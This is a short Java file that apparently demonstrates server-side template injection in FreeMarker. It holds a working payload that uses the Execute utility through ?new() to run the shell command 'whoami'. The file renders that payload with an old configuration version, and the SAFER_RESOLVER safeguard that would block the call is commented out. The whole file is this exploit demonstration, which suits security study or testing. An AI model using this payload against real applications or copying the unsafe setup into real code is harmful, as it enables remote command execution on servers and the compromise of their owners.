package com.example.demo;

import freemarker.cache.StringTemplateLoader;
import freemarker.core.TemplateClassResolver;
import freemarker.template.Configuration;
import freemarker.template.Template;

import java.io.IOException;
import java.io.OutputStreamWriter;
import java.io.StringWriter;
import java.util.HashMap;

public class freemarker_ssti {
    public static void main(String[] args) throws Exception {

        //设置模板
        HashMap<String, String> map = new HashMap<String, String>();
        String poc = "${\"freemarker.template.utility.Execute\"?new()(\"whoami\")}";
        System.out.println(poc);
        StringTemplateLoader stringLoader = new StringTemplateLoader();
        Configuration cfg = new Configuration(Configuration.VERSION_2_3_20);
        stringLoader.putTemplate("name",poc);
        cfg.setTemplateLoader(stringLoader);
        //cfg.setNewBuiltinClassResolver(TemplateClassResolver.SAFER_RESOLVER);
        //处理解析模板
        Template Template_name = cfg.getTemplate("name");
        StringWriter stringWriter = new StringWriter();

        Template_name.process(Template_name,stringWriter);


    }
}